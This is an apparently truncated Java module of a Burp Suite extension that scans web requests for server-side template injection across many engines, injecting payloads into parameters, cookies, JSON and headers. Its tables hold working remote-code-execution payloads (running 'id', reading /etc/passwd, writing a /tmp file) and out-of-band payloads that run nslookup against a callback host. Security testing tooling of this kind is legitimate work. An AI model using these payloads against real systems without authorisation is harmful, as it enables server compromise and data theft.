package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 6: Comprehensive SSTI Scanner
 * Detects Server-Side Template Injection across multiple template engines.
 * Uses polyglot probes, engine-specific payloads, and reflection context detection.
 */
public class SstiScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();

    // Polyglot probe payloads and their expected results
    private static final String[][] POLYGLOT_PROBES = {
            // payload, expectedResult, description
            {"{{7*7}}", "49", "Jinja2/Twig/Angular"},
            {"${7*7}", "49", "Freemarker/Mako/EL"},
            {"<%= 7*7 %>", "49", "ERB (Ruby)"},
            {"#{7*7}", "49", "Pug/Jade/Thymeleaf"},
            {"{7*7}", "49", "Smarty/Velocity"},
            {"{{7*'7'}}", "7777777", "Jinja2 (string multiplication)"},
            {"{{'7'*7}}", "7777777", "Twig (string repeat)"},
            {"#set($x=7*7)${x}", "49", "Velocity"},
            {"[[${7*7}]]", "49", "Thymeleaf inline"},
            {"{{= 7*7}}", "49", "doT.js"},
            {"<#assign x=7*7>${x}", "49", "Freemarker assign"},
            {"${T(java.lang.Math).random()}", "", "Spring EL (any numeric output)"},
            {"{if 7*7==49}49{/if}", "49", "Smarty (if conditional)"},
            {"@(7*7)", "49", "Razor (.NET)"},
            {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
            {"{{'7'*7}}", "7777777", "String multiplication (Jinja2/Twig)"},
            {"<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}", "uid=", "Freemarker assign RCE"},
            {"${{7*7}}", "49", "Combined Jinja2/Freemarker"},
            {"{{7*'7'}}", "7777777", "Jinja2 string repeat (alt)"},
            {"<%= system('echo 49') %>", "49", "ERB system echo"},
            {"{{constructor.constructor('return 7*7')()}}", "49", "Prototype pollution eval"},
            {"{{range.constructor('return 7*7')()}}", "49", "Nunjucks/Handlebars range constructor"},
            {"{php}echo 7*7;{/php}", "49", "Smarty PHP block (legacy)"},
            {"${7*7}", "49", "EL/Freemarker/Mako (alt)"},
            {"#{7*7}", "49", "Pug/Jade/Ruby interpolation"},
            {"${= 7*7}", "49", "doT.js (alt syntax)"},
            {"{%set x=7*7%}{{x}}", "49", "Jinja2 set tag"},
            {"{{7*7}}", "49", "Mustache/Handlebars (if evaluated)"},
            {"${7+7+7+7+7+7+7}", "49", "Spring EL addition chain"},
            {"<%= 7.*(7) %>", "49", "ERB method call"},
            {"{{\"7\"*7}}", "7777777", "Twig/Jinja2 string multiply"},
            {"p #{7*7}", "49", "Slim template (Ruby)"},
            {"{{ 7 * 7 }}", "49", "Liquid template eval"},
            {"@(7 * 7)", "49", "Razor (with spaces)"},
    };

    // Universal polyglot that triggers errors in most engines
    private static final String POLYGLOT_ERROR = "${{<%[%'\"}}%\\.";

    // Engine identification payloads (safe mode - math only)
    private static final Map<String, String[][]> ENGINE_PROBES = new LinkedHashMap<>();

    static {
        ENGINE_PROBES.put("Jinja2", new String[][]{
                {"{{config}}", "SECRET_KEY|DEBUG|TESTING", "Flask config access"},
                {"{{self.__class__}}", "TemplateReference|Undefined", "Jinja2 class"},
                {"{{request.environ}}", "SERVER_NAME|wsgi", "Flask request object"},
                {"{{[].__class__.__base__.__subclasses__()}}", "subprocess|Popen|Warning", "Python MRO"},
                {"{{lipsum.__globals__}}", "os|builtins", "Jinja2 lipsum globals"},
                {"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 RCE via cycler (AGGRESSIVE)"},
                {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "subprocess|Popen|Warning", "Jinja2 attr+hex filter bypass"},
                {"{{request.args.cmd}}", "", "Jinja2 request.args bypass (any non-empty output)"},
                {"{{().__class__.__mro__[1].__subclasses__()}}", "subprocess|Popen|Warning", "Jinja2 MRO via hex escape"},
        });
        ENGINE_PROBES.put("Twig", new String[][]{
                {"{{_self.env.getFilter('id')}}", "Twig", "Twig self reference"},
                {"{{'test'|upper}}", "TEST", "Twig filter"},
                {"{{'7'*7}}", "7777777", "Twig string repeat"},
                {"{{_self.env.getRuntimeLoader()}}", "Twig|Runtime", "Twig runtime loader"},
                {"{{dump(app)}}", "AppVariable|kernel", "Symfony app dump"},
                {"{{['id']|filter('system')}}", "uid=", "Twig RCE (AGGRESSIVE)"},
                {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
                {"{{'test'|reduce((a,b)=>a~b)}}", "test", "Twig reduce filter"},
        });
        ENGINE_PROBES.put("Freemarker", new String[][]{
                {"${.version}", "2.", "Freemarker version"},
                {"${.now}", "20", "Freemarker date (year prefix)"},
                {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "ObjectConstructor", "Freemarker OC"},
                {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Velocity", new String[][]{
                {"#set($x=7*7)$x", "49", "Velocity set"},
                {"$class.inspect('java.lang.Runtime')", "Runtime", "Velocity reflection"},
                {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "Process", "Velocity RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Thymeleaf", new String[][]{
                {"__${7*7}__", "49", "Thymeleaf preprocessor"},
                {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "Process", "Thymeleaf RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Mako", new String[][]{
                {"${7*7}", "49", "Mako eval"},
                {"${self.module.__builtins__}", "builtins", "Mako builtins access"},
                {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("ERB", new String[][]{
                {"<%= 7*7 %>", "49", "ERB eval"},
                {"<%= Dir.entries('/') %>", "[", "ERB dir listing"},
                {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Pug", new String[][]{
                {"#{7*7}", "49", "Pug eval"},
                {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Handlebars", new String[][]{
                {"{{#with \"s\" as |string|}}{{#with \"e\"}}{{this}}{{/with}}{{/with}}", "e", "Handlebars with block"},
                {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "function", "Handlebars constructor lookup"},
                {"{{this}}", "", "Handlebars this context (any non-empty output)"},
                {"{{#if true}}hbs_confirmed{{/if}}", "hbs_confirmed", "Handlebars if helper"},
                {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('id')\")}}{{/with}}{{/with}}", "uid=", "Handlebars RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Smarty", new String[][]{
                {"{math equation=\"7*7\"}", "49", "Smarty math"},
                {"{$smarty.version}", "3.|4.|5.", "Smarty version leak"},
                {"{if 7*7==49}49{/if}", "49", "Smarty if conditional"},
                {"{php}echo 7*7;{/php}", "49", "Smarty PHP tags (deprecated in v3+)"},
                {"{if phpinfo()}{/if}", "PHP Version", "Smarty phpinfo (AGGRESSIVE)"},
                {"{system('id')}", "uid=", "Smarty RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("doT.js", new String[][]{
                {"{{= 7*7}}", "49", "doT.js eval"},
                {"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Nunjucks", new String[][]{
                {"{{7*7}}", "49", "Nunjucks eval"},
                {"{{range.constructor(\"return 7*7\")()}}", "49", "Nunjucks constructor eval"},
                {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Django", new String[][]{
                {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
                {"{{settings.SECRET_KEY}}", "", "Django SECRET_KEY leak (any non-empty output)"},
                {"{% load log %}{% get_admin_log 10 as log %}{{log}}", "QuerySet|LogEntry", "Django admin log"},
                {"{% include 'admin/base.html' %}", "Django|admin|doctype", "Django template include"},
        });
        ENGINE_PROBES.put("Razor", new String[][]{
                {"@(7*7)", "49", "Razor eval"},
                {"@DateTime.Now", "20", "Razor DateTime (year prefix)"},
                {"@System.IO.Directory.GetCurrentDirectory()", "/|C:\\", "Razor directory listing"},
                {"@System.Diagnostics.Process.Start(\"id\")", "Process", "Razor RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("EJS", new String[][]{
                {"<%= 7*7 %>", "49", "EJS eval"},
                {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Mustache", new String[][]{
                {"{{#list}}test{{/list}}", "test|list", "Mustache section"},
        });
        ENGINE_PROBES.put("Liquid", new String[][]{
                {"{{ 7 | times: 7 }}", "49", "Liquid filter"},
                {"{{ 'test' | upcase }}", "TEST", "Liquid upcase filter"},
                {"{% assign x = 7 %}{{ x | times: 7 }}", "49", "Liquid assign + filter"},
        });
        ENGINE_PROBES.put("Blade", new String[][]{
                {"{{ 7*7 }}", "49", "Laravel Blade double curly"},
                {"{!! 7*7 !!}", "49", "Blade unescaped output"},
                {"@php echo 7*7; @endphp", "49", "Blade PHP block (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Plates", new String[][]{
                {"<?= 7*7 ?>", "49", "Plates short echo"},
                {"<?= $this->e('test') ?>", "test", "Plates escape helper"},
        });
        ENGINE_PROBES.put("Groovy", new String[][]{
                {"${7*7}", "49", "Groovy GString"},
                {"<% println 7*7 %>", "49", "Groovy template"},
                {"${\"cat /etc/passwd\".execute().text}", "root:", "Groovy RCE (AGGRESSIVE)"},
        });
    }

    // Error patterns that indicate template engine presence
    private static final Map<String, Pattern> ENGINE_ERROR_PATTERNS = Map.ofEntries(
            Map.entry("Jinja2", Pattern.compile("jinja2\\.exceptions|UndefinedError|TemplateSyntaxError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Twig", Pattern.compile("Twig_Error|Twig\\\\Error|twig\\.error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Freemarker", Pattern.compile("freemarker\\.core|FreeMarker|ParseException.*freemarker", Pattern.CASE_INSENSITIVE)),
            Map.entry("Velocity", Pattern.compile("org\\.apache\\.velocity|VelocityException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Thymeleaf", Pattern.compile("org\\.thymeleaf|ThymeleafView|TemplateProcessingException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mako", Pattern.compile("mako\\.exceptions|MakoException", Pattern.CASE_INSENSITIVE)),
            Map.entry("ERB", Pattern.compile("ActionView::Template::Error|ERB::Util", Pattern.CASE_INSENSITIVE)),
            Map.entry("Smarty", Pattern.compile("Smarty[_ ]error|SmartyException|Smarty_Internal", Pattern.CASE_INSENSITIVE)),
            Map.entry("Pug", Pattern.compile("PugException|pug_error|unexpected token", Pattern.CASE_INSENSITIVE)),
            Map.entry("Django", Pattern.compile("TemplateSyntaxError|django\\.template", Pattern.CASE_INSENSITIVE)),
            Map.entry("Razor", Pattern.compile("RazorEngine|System\\.Web\\.Mvc|CompilationError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Handlebars", Pattern.compile("Handlebars\\.Exception|handlebars.*error|Missing helper|Parse error", Pattern.CASE_INSENSITIVE)),
            Map.entry("EJS", Pattern.compile("ejs.*error|EJS.*compile|ReferenceError.*ejs", Pattern.CASE_INSENSITIVE)),
            Map.entry("Nunjucks", Pattern.compile("nunjucks.*error|Template render error.*nunjucks", Pattern.CASE_INSENSITIVE)),
            Map.entry("doT.js", Pattern.compile("doT\\.template|doT.*error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mustache", Pattern.compile("Mustache.*error|Missing.*tag|Unclosed.*section", Pattern.CASE_INSENSITIVE)),
            Map.entry("Liquid", Pattern.compile("Liquid.*error|Liquid::SyntaxError|Unknown tag", Pattern.CASE_INSENSITIVE)),
            Map.entry("Blade", Pattern.compile("Blade.*error|View.*not found|Undefined variable", Pattern.CASE_INSENSITIVE)),
            Map.entry("Groovy", Pattern.compile("groovy\\.lang|GroovyRuntimeException|MissingMethodException", Pattern.CASE_INSENSITIVE))
    );

    // OOB SSTI payloads for Collaborator-based blind detection
    private static final String[][] OOB_SSTI_PAYLOADS = {
        // Jinja2 / Python
        {"{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (nslookup)"},
        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subprocess)"},
        {"${__import__('os').popen('nslookup COLLAB_PLACEHOLDER').read()}", "Mako OOB (nslookup)"},
        // Twig / PHP
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('system')}}", "Twig OOB (system)"},
        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system)"},
        // Freemarker / Java
        {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup COLLAB_PLACEHOLDER\")}", "Freemarker OOB (Execute)"},
        {"${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}", "Spring EL OOB"},
        {"__${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}__", "Thymeleaf OOB"},
        // ERB / Ruby
        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick)"},
        {"<%= system('nslookup COLLAB_PLACEHOLDER') %>", "ERB OOB (system)"},
        // Pug / Node.js
        {"#{root.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}", "Pug OOB"},
        // Velocity / Java
        {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('nslookup COLLAB_PLACEHOLDER')", "Velocity OOB"},
        // Smarty / PHP
        {"{if system('nslookup COLLAB_PLACEHOLDER')}{/if}", "Smarty OOB (if system)"},
        // Nunjucks / Node.js
        {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")()}}", "Nunjucks OOB"},
        // Razor / .NET
        {"@System.Diagnostics.Process.Start(\"nslookup\",\"COLLAB_PLACEHOLDER\")", "Razor OOB"},
        // doT.js / Node.js
        {"{{= global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') }}", "doT.js OOB"},
        // Handlebars / Node.js
        {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")}}{{/with}}{{/with}}", "Handlebars OOB (constructor)"},
        // EJS / Node.js
        {"<%= process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (execSync)"},
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (require)"},
        // Django / Python (limited — Django templates are sandboxed, but custom template tags or debug mode may allow execution)
        {"{% load log %}{% get_admin_log 10 as entries %}{% for e in entries %}{{e}}{% endfor %}", "Django OOB (admin log exfil)"},
        // Additional Jinja2 OOB variants
        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subclass 287)"},
        {"{{lipsum.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (lipsum globals)"},
        {"{{cycler.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (cycler)"},
        {"{{joiner.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (joiner)"},
        {"{{namespace.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (namespace)"},
        // Additional Smarty OOB variants
        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system direct)"},
        {"{Smarty_Internal_Write_File::writeFile('/tmp/x','test',self::clearConfig())}", "Smarty OOB (file write)"},
        // Additional Twig OOB variants
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('exec')}}", "Twig OOB (exec filter)"},
        // Additional ERB OOB variants
        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick alt)"},
        // Groovy OOB
        {"${\"nslookup COLLAB_PLACEHOLDER\".execute()}", "Groovy OOB (execute)"},
        // Additional EJS OOB variants
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString() %>", "EJS OOB (toString)"},
        // Pug OOB variants
        {"#{require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()}", "Pug OOB (toString)"},
    };

    @Override
    public String getId() { return "ssti-scanner"; }

    @Override
    public String getName() { return "SSTI Scanner"; }

    @Override
    public String getDescription() {
        return "Comprehensive Server-Side Template Injection detection across 12+ template engines.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore, CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);

        for (InjectionTarget target : targets) {
            if (!dedup.markIfNew("ssti-scanner", urlPath, target.name)) continue;

            try {
                testSsti(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("SSTI test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testSsti(HttpRequestResponse original, InjectionTarget target) throws InterruptedException {
        String url = original.request().url();
        boolean aggressiveMode = config.getBool("ssti.aggressive", false);

        // Get baseline response

        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        if (baseline == null || baseline.response() == null) return;
        String baselineBody = baseline.response().bodyToString();

        // Step 1: Error-triggering polyglot
        boolean polyglotCaused500 = false;

        HttpRequestResponse errorResult = sendPayload(original, target, POLYGLOT_ERROR);
        if (errorResult != null && errorResult.response() != null) {
            String errorBody = errorResult.response().bodyToString();
            int errorStatus = errorResult.response().statusCode();

            // Check for template engine error messages
            for (Map.Entry<String, Pattern> entry : ENGINE_ERROR_PATTERNS.entrySet()) {
                if (entry.getValue().matcher(errorBody).find() && !entry.getValue().matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("ssti-scanner",
                                    "SSTI Indicator: " + entry.getKey() + " error triggered",
                                    Severity.LOW, Confidence.TENTATIVE)
                            .url(url).parameter(target.name)
                            .evidence("Engine: " + entry.getKey() + " | Polyglot triggered error response (status " + errorStatus + ")")
                            .description("Template engine error detected. Input may reach a " + entry.getKey() + " template.")
                            .requestResponse(errorResult)
                            .build());
                }
            }

            // Generic 500 error from polyglot is also suspicious
            if (errorStatus == 500 && baseline.response().statusCode() != 500) {
                polyglotCaused500 = true;
                findingsStore.addFinding(Finding.builder("ssti-scanner",
                                "SSTI Indicator: Server error from polyglot",
                                Severity.LOW, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Polyglot probe caused 500 error (baseline was " + baseline.response().statusCode() + ")")
                        .description("The SSTI polyglot probe triggered a server error, suggesting input reaches template rendering.")
                        .requestResponse(errorResult)
                        .build());
            }
        }

        // Step 2: Math evaluation probes
        boolean templateConfirmed = false;
        String confirmedEngine = null;

        for (String[] probe : POLYGLOT_PROBES) {
            String payload = probe[0];
            String expected = probe[1];
            String engineHint = probe[2];

    
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses — template evaluation should produce a 200, not a 4xx/5xx
            int responseStatus = result.response().statusCode();
            if (responseStatus >= 400) continue;

            String responseBody = result.response().bodyToString();

            // Special case: Spring EL returns random number
            if (payload.contains("T(java.lang.Math).random()")) {
                if (Pattern.compile("0\\.\\d{10,}").matcher(responseBody).find()
                        && !Pattern.compile("0\\.\\d{10,}").matcher(baselineBody).find()) {
                    templateConfirmed = true;
                    confirmedEngine = "Spring EL";
                    findingsStore.addFinding(Finding.builder("ssti-scanner",
                                    "SSTI Confirmed: Spring Expression Language",
                                    Severity.HIGH, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + payload + " | Random number appeared in response")
                            .description("Spring EL injection confirmed via Math.random() execution.")
                            .requestResponse(result)
                            .build());
                    break;
                }
                continue;
            }

            // Check if expected result appears in response but NOT in baseline
            // Support OR matching: "A|B|C" means any of A, B, C must be found
            boolean expectedFound = false;
            if (!expected.isEmpty()) {
                if (expected.contains("|")) {
                    for (String exp : expected.split("\\|")) {
                        if (responseBody.contains(exp.trim()) && !baselineBody.contains(exp.trim())) {
                            expectedFound = true;
                            break;
                        }
                    }
                } else {
                    expectedFound = responseBody.contains(expected) && !baselineBody.contains(expected);
                }
            }
            if (expectedFound) {
                templateConfirmed = true;

                Severity severity = Severity.HIGH;
                Confidence confidence = Confidence.FIRM;

                findingsStore.addFinding(Finding.builder("ssti-scanner",
                                "SSTI Detected: " + engineHint + " template evaluation",
                                severity, confidence)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Expected: " + expected + " found in response")
                        .description("Template expression was evaluated. Engine hint: " + engineHint)
                        .requestResponse(result)
                        .build());
                break;
            }

            perHostDelay();
        }

        // Step 3: Engine identification (if template evaluation confirmed)
        String identifiedEngine = null;
        if (templateConfirmed) {
            identifiedEngine = identifyEngine(original, target, baselineBody, aggressiveMode);
        }

        // Step 4: OOB SSTI via Collaborator (only if template evaluation confirmed or polyglot caused 500)
        if ((templateConfirmed || polyglotCaused500)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOobSsti(original, target, identifiedEngine);
        }
    }

    private String identifyEngine(HttpRequestResponse original, InjectionTarget target,
                                    String baselineBody, boolean aggressiveMode) {
        String url = original.request().url();

        for (Map.Entry<String, String[][]> engineEntry : ENGINE_PROBES.entrySet()) {
            String engine = engineEntry.getKey();
            String[][] probes = engineEntry.getValue();

            for (String[] probe : probes) {
                String payload = probe[0];
                String expected = probe[1];
                String desc = probe[2];

                // Skip aggressive payloads unless aggressive mode is enabled
                if (desc.contains("AGGRESSIVE") && !aggressiveMode) continue;

                try {
            
                    HttpRequestResponse result = sendPayload(original, target, payload);
                    if (result == null || result.response() == null) continue;

                    String body = result.response().bodyToString();

                    // Check for expected output
                    boolean matched = false;
                    if (expected.contains("|")) {
                        // Multiple possible matches (OR)
                        for (String exp : expected.split("\\|")) {
                            if (body.contains(exp.trim()) && !baselineBody.contains(exp.trim())) {
                                matched = true;
                                break;
                            }
                        }
                    } else {
                        matched = body.contains(expected) && !baselineBody.contains(expected);
                    }

                    if (matched) {
                        Severity severity = desc.contains("RCE") ? Severity.CRITICAL : Severity.HIGH;
                        Confidence confidence = Confidence.CERTAIN;

                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Engine Identified: " + engine + " - " + desc,
                                        severity, confidence)
                                .url(url).parameter(target.name)
                                .evidence("Payload: " + payload + " | Expected '" + expected + "' found")
                                .description("Template engine positively identified as " + engine
                                        + ". " + desc + ".")
                                .requestResponse(result)
                                .build());
                        return engine; // Engine identified, done
                    }

                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            }
        }
        return null;
    }

    private void testOobSsti(HttpRequestResponse original, InjectionTarget target, String identifiedEngine) {
        String url = original.request().url();
        for (String[] payloadInfo : OOB_SSTI_PAYLOADS) {
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];

            // If engine was identified, only send OOB payloads for that engine
            if (identifiedEngine != null && !technique.toLowerCase().contains(identifiedEngine.toLowerCase())) {
                continue;
            }

            // AtomicReference to capture the sent request/response for the finding
            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();

            String collabPayload = collaboratorManager.generatePayload(
                    "ssti-scanner", url, target.name,
                    "SSTI OOB " + technique,
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Confirmed (Out-of-Band) - " + technique,
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Server-Side Template Injection confirmed via Burp Collaborator. "
                                        + "The template engine executed the injected command, triggering a "
                                        + interaction.type().name() + " callback.")
                                .requestResponse(sentRequest.get())
                                .build());
                        api.logging().logToOutput("[SSTI OOB] Confirmed! " + technique
                                + " at " + url + " param=" + target.name);
                    }
            );

            if (collabPayload == null) continue;
            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

            try {
                sentRequest.set(sendPayload(original, target, payload));
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectionTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (target.name.contains(".")) {
                    // Nested key — parse, replace, serialize
                    String newBody = replaceNestedJsonValue(body, target.name, escaped);
                    return request.withBody(newBody);
                } else {
                    String jsonPattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                    String newBody = body.replaceFirst(jsonPattern, replacement);
                    return request.withBody(newBody);
                }
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Replace a value at a dot-notation path in a JSON string.
     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
     */
    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            // Traverse to the parent of the target key
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            // Replace the leaf value
            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, escapedValue);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<InjectionTarget> extractTargets(HttpRequest request) {
        List<InjectionTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }
        // JSON params (recursive for nested objects)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract injectable request headers
        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new InjectionTarget(h.name(), h.value(), TargetType.HEADER));
                    break;
                }
            }
        }

        return targets;
    }

    /**
     * Recursively extract JSON parameters using dot-notation for nested objects.
     */
